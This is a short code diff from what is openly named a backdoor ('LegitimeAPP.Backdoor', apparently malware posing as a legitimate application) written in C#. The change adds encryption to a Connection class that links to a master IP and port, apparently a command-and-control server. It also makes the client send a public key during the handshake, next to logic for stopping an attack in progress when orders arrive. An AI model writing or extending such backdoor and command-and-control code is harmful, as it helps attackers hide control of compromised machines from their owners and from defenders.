@@ -28,15 +28,19 @@ namespace LegitimeAPP.Backdoor {
 
         private Order order ;
 
-        
-                 
 
+        // Encryption
+
+        private Backdoor.Encryption _encryption ; 
         // Encoding 
 
         private ASCIIEncoding enc = new ASCIIEncoding() ;
 
 
         public Connection(string masterIP, int masterPort) {
+
+
+            _encryption = new Encryption() ; 
 
 
 
@@ -207,7 +211,9 @@ namespace LegitimeAPP.Backdoor {
 
 
                     stm = tcp.GetStream() ;
-                    WriteNetMessage("1") ;
+
+                    // On envoie la clé publique 
+                    WriteNetMessage(_encryption.GetPublicKey) ;
 
                     if ( _attackInProgress) {
                         order.Stop() ;
